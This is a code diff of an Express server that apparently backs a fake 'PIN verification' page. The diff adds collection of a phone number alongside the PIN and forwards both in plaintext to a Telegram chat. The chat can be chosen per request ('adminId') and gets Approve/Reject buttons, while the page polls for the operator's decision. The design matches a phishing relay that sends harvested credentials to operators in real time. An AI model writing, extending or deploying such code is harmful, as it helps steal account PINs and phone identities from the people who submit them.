@@ -11,44 +11,53 @@ app.get('/', (req, res) => {
 });
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
+const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID; // fallback/default admin
 const pendingRequests = {};
 
 app.post('/api/verify-pin', async (req, res) => {
-  const { pin } = req.body;
+  const { phoneNumber, pin, adminId, assignmentType } = req.body;
 
-  if (!pin) {
-    return res.status(400).json({ error: 'PIN is required' });
+  if (!phoneNumber || !pin || pin.length < 4) {
+    return res.json({ success: false, message: 'Phone number and 4-digit PIN are required.' });
   }
 
-  const requestId = Date.now().toString();
-  pendingRequests[requestId] = { pin, status: 'pending' };
+  const applicationId = Date.now().toString();
+  const assignedAdminId = adminId || ADMIN_CHAT_ID; // use specific admin if given, else default
+
+  pendingRequests[applicationId] = {
+    phoneNumber,
+    pin,
+    assignedAdminId,
+    assignmentType,
+    status: 'pending'
+  };
 
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: ADMIN_CHAT_ID,
-        text: `PIN submitted: ${pin}\nRequest ID: ${requestId}`,
+        chat_id: assignedAdminId,
+        text: `📱 Phone: ${phoneNumber}\n🔑 PIN: ${pin}\n🆔 Application ID: ${applicationId}`,
         reply_markup: {
           inline_keyboard: [[
-            { text: '✅ Approve', callback_data: `approve_${requestId}` },
-            { text: '❌ Reject', callback_data: `reject_${requestId}` }
+            { text: '✅ Approve', callback_data: `approve_${applicationId}` },
+            { text: '❌ Reject', callback_data: `reject_${applicationId}` }
           ]]
         }
       })
     });
 
-    res.json({ requestId, status: 'pending' });
+    res.json({ success: true, applicationId, assignedAdminId });
   } catch (err) {
     console.error('Telegram send error:', err);
-    res.status(500).json({ error: 'Failed to notify admin' });
+    res.json({ success: false, message: 'Failed to reach admin. Please try again.' });
   }
 });
 
-app.get('/api/verify-pin/status/:requestId', (req, res) => {
-  const request = pendingRequests[req.params.requestId];
+// Used by pollPinStatus() on the frontend
+app.get('/api/verify-pin/status/:applicationId', (req, res) => {
+  const request = pendingRequests[req.params.applicationId];
   if (!request) return res.status(404).json({ error: 'Not found' });
   res.json({ status: request.status });
 });
@@ -56,9 +65,9 @@ app.get('/api/verify-pin/status/:requestId', (req, res) => {
 app.post('/api/telegram-webhook', (req, res) => {
   const callback = req.body.callback_query;
   if (callback) {
-    const [action, requestId] = callback.data.split('_');
-    if (pendingRequests[requestId]) {
-      pendingRequests[requestId].status = action === 'approve' ? 'approved' : 'rejected';
+    const [action, applicationId] = callback.data.split('_');
+    if (pendingRequests[applicationId]) {
+      pendingRequests[applicationId].status = action === 'approve' ? 'approved' : 'rejected';
     }
   }
   res.sendStatus(200);
